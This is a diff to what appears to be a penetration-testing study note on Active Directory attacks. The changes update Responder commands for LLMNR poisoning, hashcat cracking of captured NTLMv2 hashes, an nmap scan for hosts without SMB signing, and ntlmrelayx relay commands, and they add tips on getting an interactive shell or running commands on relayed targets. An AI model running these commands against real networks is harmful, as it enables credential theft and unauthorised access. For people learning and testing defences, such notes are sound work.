@@ -51,7 +51,8 @@
     ip a
     #note interface
 
-    python Responder.py -I eth0 -rdw
+    sudo responder -I eth0 -dwP
+    # in Kali Linux
     ```
 
     * Event occurs in Windows
@@ -62,6 +63,7 @@
     hashcat -m 5600 ntlmhash.txt rockyou.txt
     #-m 5600 for NTLMv2
     #ntlmhash.txt contains the hashes
+    #you can use rules with a wordlist
     ```
 
   * Mitigation:
@@ -88,6 +90,7 @@
     ```shell
     nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
     #we need to note down machines with 'message signing enabled but not required'
+    #-Pn if nmap states that the host is down, but it is not
 
     vim targets.txt
     #add target IPs
@@ -103,18 +106,20 @@
     * Run Responder tool
 
     ```shell
-    python Responder.py -I eth0 -rdw
+   sudo responder -I eth0 -dwP
+    # in Kali Linux
     ```
 
     * Setup relay
 
     ```shell
-    python ntlmrelayx.py -tf targets.txt -smb2support
+    sudo ntlmrelayx.py -tf targets.txt -smb2support
 
     #trigger connection in Windows machine
     #by pointing it at the attacker machine
 
     #-i option can be used for an interactive shell
+    #-c option to execute commands like "whoami"
     ```
 
     * Event occurs in Windows machine
